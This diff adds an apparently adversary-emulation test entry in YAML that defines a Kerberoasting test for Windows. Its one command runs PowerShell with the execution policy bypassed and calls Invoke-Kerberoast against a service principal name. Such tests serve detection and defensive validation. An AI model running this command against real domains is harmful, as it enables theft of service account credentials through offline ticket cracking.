@@ -1,0 +1,6 @@
+atomic_tests:
+  - name: Request Service Ticket (Kerberoasting)
+    supported_platforms:
+      - windows
+    executor:
+      command: powershell -ExecutionPolicy Bypass -Command Invoke-Kerberoast -Spn HTTP/cifs-server
